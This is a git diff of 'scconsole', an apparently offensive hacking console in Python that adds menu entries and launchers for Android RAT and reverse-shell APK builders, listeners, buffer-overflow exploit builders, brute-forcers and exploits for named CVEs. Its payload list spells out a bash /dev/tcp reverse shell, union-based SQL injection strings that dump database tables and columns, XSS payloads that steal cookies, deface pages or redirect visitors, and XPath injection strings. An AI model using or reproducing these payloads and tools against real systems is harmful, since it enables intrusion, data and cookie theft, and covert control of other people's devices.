     Exploits                                        When created?        Discrepstion 
        |
 _______|
-|-""" + color.red + """scanner/portscan-tcp""" + color.white + """                                25/04/08       scans for open ports.
-|-""" + color.red + """scanner/ble-scanner""" + color.white + """                                 25/04/04       scans bluetooths around you (sudo permission needed!).
-|-""" + color.red + """scanner/vnc-none-auth""" + color.white + """                               25/04/08       scans the VNC port to see if it is open or closed.
-|-""" + color.red + """scanner/ftp-anon""" + color.white + """                                    25/04/08       scans target port 21 to if anonymous access is enabled on port 21 (ftp port).
-|-""" + color.red + """scanner/portmap-amp""" + color.white + """                                 25/04/08       attempts to connect to a web server at the specified IP address and checks the response for indicators of an AMP stack (Apache, MySQL, PHP).
-|-""" + color.red + """scanner/subdomain-scan""" + color.white + """                              25/04/10       This scanner exploits the subdomain scanner to look for specific subdomains by using a wordlist.
-|-""" + color.red + """scanner/portscan""" + color.white + """                                    25/04/10       scans the port you specified to see they are open or closed.
-|-""" + color.red + """scanner/ping_ip_site""" + color.white + """                                25/04/15       uses ping tool to make sure target or website is reachable.
-|-""" + color.red + """scanner/http-options""" + color.white + """                                25/05/01       scan the specified host for the available HTTP methods and print the results.
-|-""" + color.red + """scanner/https-options""" + color.white + """                               25/05/01       scan the specified host for the available HTTP methods and print the results.
-|-""" + color.red + """scanner/server-scanner""" + color.white + """                              25/05/01       It sends an HTTP GET request to the target URL and retrieves the server headers. If the server header indicates PHP, it extracts the PHP version and returns it.
+|- """ + color.red + """scanner/portscan-tcp""" + color.white + """                                25/04/08       scans for open ports.
+|- """ + color.red + """scanner/ble-scanner""" + color.white + """                                 25/04/04       scans bluetooths around you (sudo permission needed!).
+|- """ + color.red + """scanner/vnc-none-auth""" + color.white + """                               25/04/08       scans the VNC port to see if it is open or closed.
+|- """ + color.red + """scanner/ftp-anon""" + color.white + """                                    25/04/08       scans target port 21 to if anonymous access is enabled on port 21 (ftp port).
+|- """ + color.red + """scanner/portmap-amp""" + color.white + """                                 25/04/08       attempts to connect to a web server at the specified IP address and checks the response for indicators of an AMP stack (Apache, MySQL, PHP).
+|- """ + color.red + """scanner/subdomain-scan""" + color.white + """                              25/04/10       This scanner exploits the subdomain scanner to look for specific subdomains by using a wordlist.
+|- """ + color.red + """scanner/portscan""" + color.white + """                                    25/04/10       scans the port you specified to see they are open or closed.
+|- """ + color.red + """scanner/ping_ip_site""" + color.white + """                                25/04/15       uses ping tool to make sure target or website is reachable.
+|- """ + color.red + """scanner/http-options""" + color.white + """                                25/05/01       scan the specified host for the available HTTP methods and print the results.
+|- """ + color.red + """scanner/https-options""" + color.white + """                               25/05/01       scan the specified host for the available HTTP methods and print the results.
+|- """ + color.red + """scanner/server-scanner""" + color.white + """                              25/05/01       It sends an HTTP GET request to the target URL and retrieves the server headers. If the server header indicates PHP, it extracts the PHP version and returns it.
+|- """ + color.red + """scanner/WAF_Checker""" + color.white + """                                 25/07/09       This module will try some payloads and other thinks to find the target WAF(Web Application Firewall) type and version.
+|- """ + color.red + """scanner/csrf_token_detect""" + color.white + """                           25/07/12       This module will detect if target using csrf token.
+""")
+    elif scconsole == "search android":
+        print("""
+    Exploits                                        When created?        Discrepstion 
+       |
+_______|
+|- """ + color.red + """android/android_reverse_tcp""" + color.white + """                         25/06/02       Creates a RAT file with scRAT tool for an andorid device, then start a listener(but just you need to do is to send the RAT to your target!).
+|- """ + color.red + """android/GetShell""" + color.white + """                                    25/06/15       runs a listener with scRAT to get a shell from an android device.
+|- """ + color.red + """android/BuildShell""" + color.white + """                                  25/06/15       Creates a apk file to get a shell from an android.
+""")
+    elif scconsole == "search buffer_overflow":
+        print("""
+    Exploits                                        When created?        Discrepstion
+       |
+_______|
+|- """ + color.red + """buffer_overflow/fuzzer_basic""" + color.white + """                        25/07/11       Try some bytes and finds a crash.
+|- """ + color.red + """buffer_overflow/fuzzer_pattern""" + color.white + """                      25/07/11       Try to send a Pattern.
+|- """ + color.red + """buffer_overflow/find_offsec""" + color.white + """                         25/07/11       Try to find offsec.
+|- """ + color.red + """buffer_overflow/buffer_overflow_exploit_builder""" + color.white + """     25/07/11       Try to exploit target with crash-byte, offsec you found and your shellcode(generate shellcode with 'scshellcodegenerator' and start a listener to get a shell).
+|- """ + color.red + """buffer_overflow/fuzzer""" + color.white + """                              25/07/11       Try some bytes and finds a crash. (you need to config it from : exploits/buffer_overflow/fuzzer.py , line 12 to your target ip and port).
 """)
     elif scconsole == "show payloads":
         print("""
@@ -654,12 +655,57 @@ _______|
 """ + color.green + """; netstat -an""" + color.white + """ ---> Try to see the open ports from OS Command Injection vulnerabilitie.
 
 """ + color.green + """bash -c 'bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1'""" + color.white + """ ---> trys to connect back to the attacker machine after finding OS Command Injection vulnerabilitie with bash.
+
+""" + color.green + """' order by [The number you want]""" + color.white + """  ---> SQL Injection number of columns payload.
+
+""" + color.green + """' union select [number of columns (example: 1,2,...)],database() #""" + color.white + """  ---> SQL Injection database name, union payload.
+
+""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat(table_name) from information_schema.tables where table_schema=database() #""" + color.white + """  ---> SQL Injection tables name, union payload.
+
+""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat(column_name) from information_schema.columns where table_name='[Table name]' #""" + color.white + """  ---> SQL Injection columns name, union payload.
+
+""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat([column name], ':', [column name]) from [Table name] #""" + color.white + """  ---> SQL Injection tables name, union payload.
+
+""" + color.green + """<h1> hello </h1>""" + color.white + """  ---> XSS (Persistent) test payload.
+
+""" + color.green + """<script>document.write('<iframe src="http://example.com></iframe>')</script>""" + color.white + """  ---> XSS (Persistent) iframe payload.
+
+""" + color.green + """<script>document.write('<iframe src=\ "http://127.0.0.1/take_cookies.php?cookie=' + document.cookie + '\ " width="0" height="0"> </iframe>')</script>""" + color.white + """  ---> XSS (Persistent) take cookies payload.
+
+""" + color.green + """<script>document.body.innerHTML="<h1>you have been hacked</h1></br></br><img src="https://example.com/image.jpg"></img>"</script>""" + color.white + """  ---> XSS (Persistent) Deface payload.
+
+""" + color.green + """<script>window.location="https://example.com"</script>""" + color.white + """  ---> XSS (Persistent) Redirect payload.
+
+""" + color.green + """' or ''='""" + color.white + """  ---> XPath injection test payload.
+
+""" + color.green + """aa' or substring(name(/*[1]),1,1)='u' and '1'='1""" + color.white + """  ---> XPath injection brute-force node root payload.
+
+""" + color.green + """aa' or substring(name(/*[1]/*[1]),1,1)='u' and '1'='1""" + color.white + """  ---> XPath injection brute-force child payload.
+
+""" + color.green + """' order by [The number you want]""" + color.white + """  ---> AJAX SQL Injection number of columns payload.
+
+""" + color.green + """' union select [number of columns (example: 1,2,...)],database() #""" + color.white + """  ---> AJAX SQL Injection database name, union payload.
+
+""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat(table_name) from information_schema.tables where table_schema=database() #""" + color.white + """  ---> AJAX SQL Injection tables name, union payload.
+
+""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat(column_name) from information_schema.columns where table_name='[Table name]' #""" + color.white + """  ---> AJAX SQL Injection columns name, union payload.
+
+""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat([column name], ':', [column name]) from [Table name] #""" + color.white + """  ---> AJAX SQL Injection tables name, union payload.
+
+""" + color.green + """7ttttttttt'}}); alert(3); //""" + color.white + """  ---> AJAX XSS payload.
+
+""" + color.green + """windows_privilage_escalation""" + color.white + """  ---> windows privilage escalation tester and payloads.
+
+""" + color.green + """rce_client""" + color.white + """  ---> rce(remote command execution) payload, use 'multi/rce_server' as attacker.
+
+""" + color.green + """http://<target-ip>/login?dst=javascript:alert(3)""" + color.white + """  ---> MikroTik RouterOS 7.19.1 (Reflected XSS) - Visit the following URL while connected to the vulnerable MikroTik hotspot service.
 """)
-    elif scconsole == "db_scscanner -h":
+    elif scconsole == "db_scscanner -h" or scconsole == "db_scscanner" or scconsole == "db_scscanner ":
         print("""
 Usage: db_scscanner [option]
 
-Examples: db_scscanner -o
+Example Options: 
+          db_scscanner -o
           db_scscanner -p
           db_scscanner -w
           db_scscanner -h
@@ -669,35 +715,7 @@ Examples: db_scscanner -o
 Options:
   -h --->   Display this help message
   -p --->   Scan specific ports on a host
-  -o --->   Scan for the operating system of a host from 7,21,22,80 and 8080 ports
-  -w --->   Scan a website for open ports from 1 to 65536
-  results --->   Display the scans you done
-  -n-scan --->   Normal scan
-
-Arguments:
-  [host]               Single host IP address or range (e.g., 10.11.1.0 or 10.11.1.1-254)
-  [port]               Single port number or comma-separated list of ports (e.g., 80 or 7,22,80,8080)
-  [website]            Website URL (e.g., example.com)
-
-the tool will asks for target IP or URL!
-
-sudo reqired!!
-""")
-    elif scconsole == "db_scscanner" or scconsole == "db_scscanner ":
-        print("""
-Usage: db_scscanner [option]
-
-Examples: db_scscanner -o
-          db_scscanner -p
-          db_scscanner -w
-          db_scscanner -h
-          db_scscanner results
-          db_scscanner -n-scan
-
-Options:
-  -h --->   Display this help message
-  -p --->   Scan specific ports on a host
-  -o --->   Scan for the operating system of a host from 7,21,22,80 and 8080 ports
+  -o --->   Scan for the operating system of a host from 7,21,22,25,80,443 and 8080 ports
   -w --->   Scan a website for open ports from 1 to 65536
   results --->   Display the scans you done
   -n-scan --->   Normal scan
@@ -726,6 +744,13 @@ sudo reqired!!
         os.system(f'sudo python db_scscanner.py -w {targeturl441}')
     elif scconsole == "db_scscanner results":
         os.system(f'python db_scscanner.py results')
+    elif scconsole == "gui" or scconsole == "GUI":
+        print("Starting gui ...")
+        time.sleep(1)
+        print("Started!")
+        os.system('sudo python scconsolegui.py')
+        print("Exiting from scconsole gui ...")
+        time.sleep(1)
     elif scconsole == "use exploit/bypassuac-eventvwr":
         time.sleep(0.5)
         print("using exploit/bypassuac-eventvwr.")
@@ -742,14 +767,6 @@ sudo reqired!!
         time.sleep(0.5)
         print("using exploit/reverse-shell.")
         exploitreverseshell()
-    elif scconsole == "use exploit/handler/handler":
-        time.sleep(0.5)
-        print("using exploit/handler/handler.")
-        exploithandlerhandler()
-    elif scconsole == "use exploit/handler/listining":
-        time.sleep(0.5)
-        print("using exploit/handler/listining.")
-        exploithandlerlistining()
     elif scconsole == "use exploit/cve-2023-22518/cve-2023-22518":
         time.sleep(0.5)
         print("using exploit/cve-2023-22518/cve-2023-22518.")
@@ -1254,6 +1271,126 @@ sudo reqired!!
         time.sleep(0.5)
         print("using site/shell_inject")
         siteshellinject()
+    elif scconsole == "use android/android_reverse_tcp":
+        time.sleep(0.5)
+        print("using android/android_reverse_tcp")
+        androidandroidreversetcp()
+    elif scconsole == "use auxiliary/xss_scanner":
+        time.sleep(0.5)
+        print("using auxiliary/xss_scanner")
+        auxiliaryxssscanner()
+    elif scconsole == "use android/GetShell":
+        time.sleep(0.5)
+        print("using android/GetShell")
+        androidGetShell()
+    elif scconsole == "use android/BuildShell":
+        time.sleep(0.5)
+        print("using android/BuildShell")
+        androidBuildShell()
+    elif scconsole == "use auxiliary/sql-injection-db-tbl-c":
+        time.sleep(0.5)
+        print("using auxiliary/sql-injection-db-tbl-c")
+        auxiliarysqlinjectiondbtblc()
+    elif scconsole == "use auxiliary/xss_tester":
+        time.sleep(0.5)
+        print("using auxiliary/xss_tester")
+        auxiliaryxsstester()
+    elif scconsole == "use site/os_finder":
+        time.sleep(0.5)
+        print("using site/os_finder")
+        siteosfinder()
+    elif scconsole == "use site/dir_enum":
+        time.sleep(0.5)
+        print("using site/dir_enum")
+        sitedirenum()
+    elif scconsole == "use site/sql_injector":
+        time.sleep(0.5)
+        print("using site/sql_injector")
+        sitesqlinjector()
+    elif scconsole == "use site/cmd_injector":
+        time.sleep(0.5)
+        print("using site/cmd_injector")
+        sitecmdinjector()
+    elif scconsole == "use site/lfi_rfi_scanner":
+        time.sleep(0.5)
+        print("using site/lfi_rfi_scanner")
+        sitelfirfiscanner()
+    elif scconsole == "use site/xss_scan":
+        time.sleep(0.5)
+        print("using site/xss_scan")
+        sitexssscan()
+    elif scconsole == "use site/upload_finder":
+        time.sleep(0.5)
+        print("using site/upload_finder")
+        siteuploadfinder()
+    elif scconsole == "use auxiliary/ftp_brute_force":
+        time.sleep(0.5)
+        print("using auxiliary/ftp_brute_force")
+        auxiliaryftpbruteforce()
+    elif scconsole == "use multi/rce_server":
+        time.sleep(0.5)
+        print("using multi/rce_server")
+        multirceserver()
+    elif scconsole == "use windows/Exel_Password_Recovery":
+        time.sleep(0.5)
+        print("using windows/Exel_Password_Recovery")
+        windowsExelPasswordRecovery()
+    elif scconsole == "use scanner/WAF_Checker":
+        time.sleep(0.5)
+        print("using scanner/WAF_Checker")
+        scannerWAFChecker()
+    elif scconsole == "use multi/listener":
+        time.sleep(0.5)
+        print("using multi/listener")
+        multilistener()
+    elif scconsole == "use buffer_overflow/fuzzer_basic":
+        time.sleep(0.5)
+        print("using buffer_overflow/fuzzer_basic")
+        bufferoverflowfuzzerbasic()
+    elif scconsole == "use buffer_overflow/fuzzer_pattern":
+        time.sleep(0.5)
+        print("using buffer_overflow/fuzzer_pattern")
+        bufferoverflowfuzzerpattern()
+    elif scconsole == "use buffer_overflow/find_offsec":
+        time.sleep(0.5)
+        print("using buffer_overflow/find_offsec")
+        bufferoverflowfindoffsec()
+    elif scconsole == "use buffer_overflow/buffer_overflow_exploit_builder":
+        time.sleep(0.5)
+        print("using buffer_overflow/buffer_overflow_exploit_builder")
+        bufferoverflowbufferoverflowexploitbuilder()
+    elif scconsole == "use scanner/csrf_token_detect":
+        time.sleep(0.5)
+        print("using scanner/csrf_token_detect")
+        scannercsrftokendetect()
+    elif scconsole == "use auxiliary/https_brute_force":
+        time.sleep(0.5)
+        print("using auxiliary/https_brute_force")
+        auxiliaryhttpsbruteforce()
+    elif scconsole == "use windows/windows_webdav_url_rce_cve_2025_33053":
+        time.sleep(0.5)
+        print("using windows/windows_webdav_url_rce_cve_2025_33053")
+        windowswindowswebdavurlrcecve202533053()
+    elif scconsole == "use site/cve_2021_41773_apache_rce":
+        time.sleep(0.5)
+        print("using site/cve_2021_41773_apache_rce")
+        sitecve202141773apacherce()
+    elif scconsole == "use site/cve_2021_42013_apache_bypass_rce":
+        time.sleep(0.5)
+        print("using site/cve_2021_42013_apache_bypass_rce")
+        sitecve202142013apachebypassrce()
+    elif scconsole == "use auxiliary/mikrotik-routeros-7-19-1-xss":
+        time.sleep(0.5)
+        print("using auxiliary/mikrotik-routeros-7-19-1-xss")
+        auxiliarymikrotikrouteros7191xss()
+    elif scconsole == "use site/file_list_wordpress_pligun_4-2-2":
+        time.sleep(0.5)
+        print("using site/file_list_wordpress_pligun_4-2-2")
+        sitefilelistwordpresspligun422()
+    elif scconsole == "use windows/smbghost":
+        time.sleep(0.5)
+        print("using windows/smbghost")
+        windowssmbghost()
     elif scconsole == "use system commands":
             OSconsole()
             OSconsole()
@@ -1480,82 +1617,6 @@ you will specifiy these options when you run or exploit it!
         time.sleep(0.5)
         Console()
     elif scconsole16 == "exit":
-        exit()
-    else:
-        print("There is no command or option like that!\nunusing ...")
-        time.sleep(0.5)
-        Console()
-
-def exploithandlerhandler():
-    scconsole17 = input("sc~" + color.red + "(exploit/handler/handler)" + color.white + ">")
-    if scconsole17 == "help":
-        print("""
-help ---> to see this help menu.
-clear ---> to clear the screen.
-unuse ---> to unuse this exploit.
-exit ---> to exit from scconsole.
-run ---> to run the exploit you selected.
-exploit ---> to run the exploit you selected.
-show options ---> to see the options.
-""")
-        exploithandlerhandler()
-    elif scconsole17 == "clear":
-        os.system('clear')
-        exploithandlerhandler()
-    elif scconsole17 == "show options":
-        print("""
-NO OPTION OR DISCREPTIONS HERE!
-""")
-        exploithandlerhandler()
-    elif scconsole17 == "run":
-        os.system('python exploits/handler/handler.py')
-        exploithandlerhandler()
-    elif scconsole17 == "exploit":
-        os.system('python exploits/handler/handler.py')
-        exploithandlerhandler()
-    elif scconsole17 == "unuse":
-        print("unusing exploit/handler/handler.")
-        time.sleep(0.5)
-        Console()
-    elif scconsole17 == "exit":
-        exit()
-    else:
-        print("There is no command or option like that!\nunusing ...")
-        time.sleep(0.5)
-        Console()
-
-def exploithandlerlistining():
-    scconsole18 = input("sc~" + color.red + "(exploit/handler/listining)" + color.white + ">")
-    if scconsole18 == "help":
-        print("""
-help ---> to see this help menu.
-clear ---> to clear the screen.
-unuse ---> to unuse this exploit.
-exit ---> to exit from scconsole.
-run ---> to run the exploit you selected.
-exploit ---> to run the exploit you selected.
-show options ---> to see the options.
-""")
-        exploithandlerlistining()
-    elif scconsole18 == "clear":
-        os.system('clear')
-        exploithandlerlistining()
-    elif scconsole18 == "show options":
-        print("""
-NO OPTION OR DISCREPTIONS HERE!
-""")
-        exploithandlerlistining()
-    elif scconsole18 == "run":
-        os.system('python exploits/handler/listining.py')
-        exploithandlerlistining()
-    elif scconsole18 == "exploit":
-        os.system('python exploits/handler/listining.py')
-        exploithandlerlistining()
-    elif scconsole18 == "unuse":
-        print("unusing exploit/handler/listining.")
-        time.sleep(0.5)
-        Console()
-    elif scconsole18 == "exit":
         exit()
     else:
         print("There is no command or option like that!\nunusing ...")
@@ -7278,7 +7339,7 @@ show payloads ---> shows the payloads that this exploit using.
 OPTIONS          | DISCREPTIONS
 -----------------|----------------------
 LHOST            | specify the listener host.
-LPOORT           | specify the listener port.
+LPORT           | specify the listener port.
 URL              | specify the target url with parameter (example: https://example.com/find.php?find=new.txt).
 METHOD           | specify the http method(GET recommended).
 PARAMETER_TEST   | specify the parameter to test (example: find).
@@ -7312,7 +7373,7 @@ you will specifiy these options when you run or exploit it!
 
 """ + color.green + """bash -c 'bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1'""" + color.white + """ ---> trys to connect back to the attacker machine after finding OS Command Injection vulnerabilitie with bash.
 
-the exploit is using more payloads but these are recomended!
+the exploit is using these and other payloads.
 """)
         siteshellinject()
     elif scconsole146 == "run":
@@ -7326,6 +7387,1351 @@ the exploit is using more payloads but these are recomended!
         time.sleep(0.5)
         Console()
     elif scconsole146 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+
+def androidandroidreversetcp():
+    scconsole147 = input("sc~" + color.red + "(android/android_reverse_tcp)" + color.white + ">")
+    if scconsole147 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        androidandroidreversetcp()
+    elif scconsole147 == "clear":
+        os.system('clear')
+        androidandroidreversetcp()
+    elif scconsole147 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LHOST            | specify the listener host for RAT file.
+LPORT            | specify the listener port for RAT file and listener.
+OUTPUT           | specify the output name (with .apk).
+
+Uses scRAT tool to generate!
+
+you will specifiy these options when you run or exploit it!
+""")
+        androidandroidreversetcp()
+    elif scconsole147 == "run":
+        os.system('python exploits/android/android_reverse_tcp.py')
+        androidandroidreversetcp()
+    elif scconsole147 == "exploit":
+        os.system('python exploits/android/android_reverse_tcp.py')
+        androidandroidreversetcp()
+    elif scconsole147 == "unuse":
+        print("unusing android/android_reverse_tcp.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole147 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+
+def auxiliaryxssscanner():
+    scconsole148 = input("sc~" + color.red + "(auxiliary/xss_scanner)" + color.white + ">")
+    if scconsole148 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        auxiliaryxssscanner()
+    elif scconsole148 == "clear":
+        os.system('clear')
+        auxiliaryxssscanner()
+    elif scconsole148 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify the target url.
+WORDLIST         | specify a wordlist that uses a xss payloads (scconsole haves one : /scconsole_wordlists/xss_payloads.txt)
+
+you will specifiy these options when you run or exploit it!
+""")
+        auxiliaryxssscanner()
+    elif scconsole148 == "run":
+        os.system('python exploits/auxiliary/xss_scanner.py')
+        auxiliaryxssscanner()
+    elif scconsole148 == "exploit":
+        os.system('python exploits/auxiliary/xss_scanner.py')
+        auxiliaryxssscanner()
+    elif scconsole148 == "unuse":
+        print("unusing auxiliary/xss_scanner.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole148 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+
+def androidGetShell():
+    scconsole149 = input("sc~" + color.red + "(android/GetShell)" + color.white + ">")
+    if scconsole149 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        androidGetShell()
+    elif scconsole149 == "clear":
+        os.system('clear')
+        androidGetShell()
+    elif scconsole149 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LPORT            | specify the listener port.
+
+Uses scRAT tool!
+
+you will specifiy these options when you run or exploit it!
+""")
+        androidGetShell()
+    elif scconsole149 == "run":
+        os.system('python exploits/android/GetShell.py')
+        androidGetShell()
+    elif scconsole149 == "exploit":
+        os.system('python exploits/android/GetShell.py')
+        androidGetShell()
+    elif scconsole149 == "unuse":
+        print("unusing android/GetShell.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole149 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def androidBuildShell():
+    scconsole150 = input("sc~" + color.red + "(android/BuildShell)" + color.white + ">")
+    if scconsole150 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        androidBuildShell()
+    elif scconsole150 == "clear":
+        os.system('clear')
+        androidBuildShell()
+    elif scconsole150 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LHOST            | specify the listener host.
+LPORT            | specify the listener port.
+OUTPUT           | specify the output name (with .apk).
+
+Uses scRAT tool to generate!
+
+you will specifiy these options when you run or exploit it!
+""")
+        androidBuildShell()
+    elif scconsole150 == "run":
+        os.system('python exploits/android/BuildShell.py')
+        androidBuildShell()
+    elif scconsole150 == "exploit":
+        os.system('python exploits/android/BuildShell.py')
+        androidBuildShell()
+    elif scconsole150 == "unuse":
+        print("unusing android/BuildShell.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole150 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def auxiliarysqlinjectiondbtblc():
+    scconsole151 = input("sc~" + color.red + "(auxiliary/sql-injection-db-tbl-c)" + color.white + ">")
+    if scconsole151 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        auxiliarysqlinjectiondbtblc()
+    elif scconsole151 == "clear":
+        os.system('clear')
+        auxiliarysqlinjectiondbtblc()
+    elif scconsole151 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify the target url(without any parameter example: http://example.com/new.php).
+PARAMETER        | it will uses id parameter (?id=).
+METHOD           | specify the method GET or POST.
+
+try to guess how many columns haves (10 times), try to take out the database name, try to take out the table names, try to take out the column named 'users'.
+
+you will specifiy these options when you run or exploit it!
+""")
+        auxiliarysqlinjectiondbtblc()
+    elif scconsole151 == "run":
+        targetwebsite = input("Enter target URL (without parameter example: http://example.com/new.php): ")
+        method24 = input("Enter method (GET/POST): ")
+        os.system(f'python exploits/auxiliary/sql-injection-db-tbl-c.py {targetwebsite} {method24}')
+        auxiliarysqlinjectiondbtblc()
+    elif scconsole151 == "exploit":
+        targetwebsite1 = input("Enter target URL (without parameter example: http://example.com/new.php): ")
+        method25 = input("Enter method (GET/POST): ")
+        os.system(f'python exploits/auxiliary/sql-injection-db-tbl-c.py {targetwebsite1} {method25}')
+        auxiliarysqlinjectiondbtblc()
+    elif scconsole151 == "unuse":
+        print("unusing auxiliary/sql-injection-db-tbl-c.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole151 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def auxiliaryxsstester():
+    scconsole152 = input("sc~" + color.red + "(auxiliary/xss_tester)" + color.white + ">")
+    if scconsole152 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        auxiliaryxsstester()
+    elif scconsole152 == "clear":
+        os.system('clear')
+        auxiliaryxsstester()
+    elif scconsole152 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify the target url.
+
+you will specifiy these options when you run or exploit it!
+""")
+        auxiliaryxsstester()
+    elif scconsole152 == "run":
+        targetwebsite2 = input("Enter target URL: ")
+        os.system(f'python exploits/auxiliary/xss_tester.py {targetwebsite2}')
+        auxiliaryxsstester()
+    elif scconsole152 == "exploit":
+        targetwebsite3 = input("Enter target URL: ")
+        os.system(f'python exploits/auxiliary/xss_tester.py {targetwebsite3}')
+        auxiliaryxsstester()
+    elif scconsole152 == "unuse":
+        print("unusing auxiliary/xss_tester.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole152 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+
+def siteosfinder():
+    scconsole153 = input("sc~" + color.red + "(site/os_finder)" + color.white + ">")
+    if scconsole153 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        siteosfinder()
+    elif scconsole153 == "clear":
+        os.system('clear')
+        siteosfinder()
+    elif scconsole153 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify the target url to find target OS.
+
+you will specifiy these options when you run or exploit it!
+""")
+        siteosfinder()
+    elif scconsole153 == "run":
+        targetwebsite4 = input("Enter target URL: ")
+        os.system(f'python exploits/site/os_finder.py {targetwebsite4}')
+        siteosfinder()
+    elif scconsole153 == "exploit":
+        targetwebsite5 = input("Enter target URL: ")
+        os.system(f'python exploits/site/os_finder.py {targetwebsite5}')
+        siteosfinder()
+    elif scconsole153 == "unuse":
+        print("unusing site/os_finder.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole153 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+
+def sitedirenum():
+    scconsole154 = input("sc~" + color.red + "(site/dir_enum)" + color.white + ">")
+    if scconsole154 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        sitedirenum()
+    elif scconsole154 == "clear":
+        os.system('clear')
+        sitedirenum()
+    elif scconsole154 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify the target url.
+WORDLIST         | specify the wordlist.
+
+you will specifiy these options when you run or exploit it!
+""")
+        sitedirenum()
+    elif scconsole154 == "run":
+        targetweb = input("Enter target URL: ")
+        dirwordlist = input("Enter the wordlist: ")
+        os.system(f'python exploits/site/dir_enum.py {targetweb} {dirwordlist}')
+        sitedirenum()
+    elif scconsole154 == "exploit":
+        targetweb2 = input("Enter target URL: ")
+        dirwordlist2 = input("Enter the wordlist: ")
+        os.system(f'python exploits/site/dir_enum.py {targetweb2} {dirwordlist2}')
+        sitedirenum()
+    elif scconsole154 == "unuse":
+        print("unusing site/dir_enum.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole154 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+
+def sitesqlinjector():
+    scconsole155 = input("sc~" + color.red + "(site/sql_injector)" + color.white + ">")
+    if scconsole155 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        sitesqlinjector()
+    elif scconsole155 == "clear":
+        os.system('clear')
+        sitesqlinjector()
+    elif scconsole155 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify the target url (if it is GET method, specify it with parameter, example: https://example.com/vuln.php?id=1).
+PARAMETER        | specify the parameter(if GET specify that GET parameter: id , if POST use 'find-login-fields' module to extract the parameters and specify just one of them: username).
+METHOD           | specify the method GET or POST.
+DATA (IF POST)   | if method is POST, specify the parameters and put the values as 'value' (example: username=value&passwd=value2&submit).
+
+TABLE_NAME       | after it extract the tables, specify one of the tables to extract the columns.
+
+you will specifiy these options when you run or exploit it!
+""")
